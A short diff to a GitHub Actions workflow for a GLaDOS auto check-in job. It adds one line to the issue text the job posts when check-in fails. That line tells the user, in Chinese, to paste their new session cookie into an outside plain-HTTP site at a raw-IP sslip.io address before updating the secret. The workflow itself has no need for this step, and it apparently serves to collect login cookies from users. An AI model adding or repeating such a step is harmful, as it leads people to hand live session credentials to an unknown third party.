@@ -92,6 +92,8 @@ jobs:
             gh issue create --title "$TITLE" \
               --body "自动签到没成功（GLaDOS 返回「没有权限」，通常是 cookie 过期或被顶掉）。
 
+          **先自测**：打开 http://ck.8-218-152-183.sslip.io/ ，把新 cookie 粘进去，确认有效再更新 secret。
+
           运行日志：${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
 
           ## 怎么修
